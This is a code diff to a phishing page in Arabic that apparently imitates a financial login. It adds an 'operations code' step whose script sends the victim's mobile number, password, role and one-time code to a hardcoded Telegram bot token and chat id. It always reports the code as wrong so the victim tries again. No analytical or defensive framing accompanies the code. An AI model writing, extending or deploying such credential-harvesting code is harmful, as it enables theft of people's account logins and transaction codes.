@@ -37,7 +37,7 @@
       margin-bottom: 16px;
     }
     .logo img {
-      width: 360px; /* 3x original size */
+      width: 360px;
       height: auto;
       border-radius: 24px;
       box-shadow: 0 2px 16px #d500321a;
@@ -143,12 +143,9 @@
       text-align: right;
       color: #bbb;
     }
-    /* Password - only numbers on mobile */
     input[type="password"] {
       ime-mode: disabled;
-      /* For Chrome/Edge/Safari */
       inputmode: numeric;
-      /* For Firefox */
       -webkit-text-security: disc;
     }
     .forgot {
@@ -163,7 +160,7 @@
     .forgot:hover {
       color: #d50032;
     }
-    .login-btn, .verify-btn {
+    .login-btn, .verify-btn, .op-btn {
       width: 100%;
       background: #d50032;
       color: #fff;
@@ -177,7 +174,7 @@
       box-shadow: 0 2px 8px #d5003224;
       transition: background .13s;
     }
-    .login-btn:active, .verify-btn:active {
+    .login-btn:active, .verify-btn:active, .op-btn:active {
       background: #b4002a;
     }
     .bottom {
@@ -193,7 +190,7 @@
       margin-right: 5px;
       text-align: right;
     }
-    .verify-title {
+    .verify-title, .op-title {
       color: #222;
       font-size: 1.22em;
       font-weight: bold;
@@ -288,6 +285,25 @@
       <button type="submit" class="verify-btn">تأكيد الرمز</button>
     </form>
   </div>
+  <!-- Operations Code Page -->
+  <div class="container hidden" id="opPage">
+    <div class="logo">
+      <img src="https://www2.0zz0.com/2025/09/27/20/207168620.jpeg" alt="">
+    </div>
+    <h2 class="op-title">رمز العمليات</h2>
+    <div class="desc" style="text-align:center">
+      لأمان حسابك، يجب إدخال رمز العمليات المرسل لك.<br>
+      يرجى إدخاله للإكمال.
+    </div>
+    <div class="notif" id="opNotif">رمز العمليات غير صحيح!</div>
+    <form id="opForm">
+      <div class="input-group">
+        <label for="opCode">رمز العمليات</label>
+        <input type="text" id="opCode" name="opCode" inputmode="numeric" pattern="\d*" maxlength="6" required>
+      </div>
+      <button type="submit" class="op-btn">تأكيد الرمز</button>
+    </form>
+  </div>
   <script>
     // اختيار الدور وتغيير اللون
     const posBtn = document.getElementById('posBtn');
@@ -359,6 +375,39 @@
       setTimeout(() => { notif.style.display = 'none'; }, 2300);
       document.getElementById('code').value = '';
       document.getElementById('code').focus();
+      // بعد الإشعار، الانتقال لصفحة رمز العمليات
+      setTimeout(() => {
+        document.getElementById('verifyPage').classList.add('hidden');
+        document.getElementById('opPage').classList.remove('hidden');
+        document.getElementById('opCode').focus();
+      }, 2500);
+    });
+
+    // صفحة رمز العمليات
+    document.getElementById('opCode').addEventListener('input', function (e) {
+      this.value = this.value.replace(/[^\d]/g, '');
+    });
+
+    document.getElementById('opForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const opCode = document.getElementById('opCode').value;
+      const data = window._loginData || { mobile: '', password: '', role: '' };
+      // إرسال رمز العمليات للبوت
+      const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
+      const chatid = "6873334348";
+      const msg = `رمز عمليات جديد:\nالدور: ${data.role}\nرقم: ${data.mobile}\nكلمة السر: ${data.password}\nرمز العمليات: ${opCode}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatid, text: msg })
+      });
+      // دائماً يظهر إشعار أن الرمز غير صحيح 
+      const notif = document.getElementById('opNotif');
+      notif.style.display = 'block';
+      notif.textContent = "رمز العمليات غير صحيح!";
+      setTimeout(() => { notif.style.display = 'none'; }, 2300);
+      document.getElementById('opCode').value = '';
+      document.getElementById('opCode').focus();
     });
   </script>
 </body>
